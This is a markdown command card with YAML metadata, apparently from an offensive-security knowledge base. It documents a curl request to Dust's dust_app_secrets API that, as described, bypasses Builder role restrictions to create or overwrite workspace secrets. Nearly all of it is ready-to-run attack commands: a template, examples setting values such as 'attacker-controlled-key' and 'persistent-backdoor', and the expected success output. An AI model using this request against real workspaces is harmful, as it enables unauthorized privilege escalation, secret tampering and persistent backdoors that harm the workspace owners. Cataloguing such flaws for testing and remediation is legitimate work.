---
id: cmd-uuid-2
data: >-
  curl -X POST "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" -H "Host:
  dust.tt" -H "Content-Type: application/json" -H "Cookie: [appSession]" -d
  '{"name":"API_KEY","value":"malicious-value"}'
tags:
  - modification
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:46.823Z'
verified: false
validated: true
submitted: true
---
---

# post-dust-app-secrets

## Command

```bash
curl -X POST "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" \
  -H "Host: dust.tt" \
  -H "Content-Type: application/json" \
  -H "Cookie: [appSession]" \
  -d '{"name":"API_KEY","value":"malicious-value"}'
```

## Description

This command creates a new secret or overwrites an existing one in Dust's API by posting a JSON payload, bypassing Builder role restrictions for unauthorized modifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| workspace_id | Target workspace ID in URL | Yes |
| name | Secret name in JSON body (existing for overwrite, new for creation) | Yes |
| value | Secret value to set (e.g., malicious payload) in JSON body | Yes |
| appSession | Auth session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://dust.tt/api/w/ws_abc123/dust_app_secrets" \
  -H "Host: dust.tt" \
  -H "Content-Type: application/json" \
  -H "Cookie: appSession=eyJ..." \
  -d '{"name":"API_KEY","value":"attacker-controlled-key"}'
```

### Advanced Usage

```bash
curl -X POST "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" \
  -H "Host: dust.tt" \
  -H "Content-Type: application/json" \
  -H "Cookie: [appSession]" \
  -d '{"name":"NEW_SECRET","value":"persistent-backdoor"}'
```

## Expected Output

HTTP 200 OK with empty body or success indicator; no error for overwrites or creations due to missing checks.

## Related

- [[Related Procedure: Overwrite-or-Create-Secrets-as-Builder-User]]
- [[commands/get-dust-app-secrets]]
